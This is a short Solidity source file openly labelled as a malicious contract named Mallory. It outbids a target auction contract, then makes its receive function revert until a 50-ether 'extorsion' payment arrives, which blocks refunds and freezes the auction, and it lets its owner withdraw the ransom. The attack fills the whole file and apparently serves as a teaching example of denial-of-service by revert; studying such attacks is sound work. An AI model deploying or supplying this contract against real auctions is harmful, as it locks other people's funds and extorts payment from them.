// Malicious Contract
// SPDX-License-Identifier: GPL-3.0
pragma solidity >= 0.8;


contract Mallory {
    address owner;
    bool public locked;
    uint ransom; 

    constructor() {
        locked = true;
        owner = msg.sender;
        ransom = 50 ether;        
    }

    function become_highest_bidder(address target) payable public {
        (bool success, bytes memory _data) = target.call{value: msg.value, gas: 70000}(abi.encodeWithSignature("bid()"));
        if (!success) {revert();}
    }

    function payRansom() payable public {
    //Function that accept ETH to unlock or owner tx
        require(msg.value >= ransom);
        locked = false;
    }

    function withdraw() external{
    //function to retrieve ether if there is some in deposit
        require(msg.sender == owner);
        payable(msg.sender).transfer(address(this).balance);
    }

   receive() external payable{
       // if (locked) {revert("Locked!");}
       require(!locked,"Better pay the extorsion");
    }

}
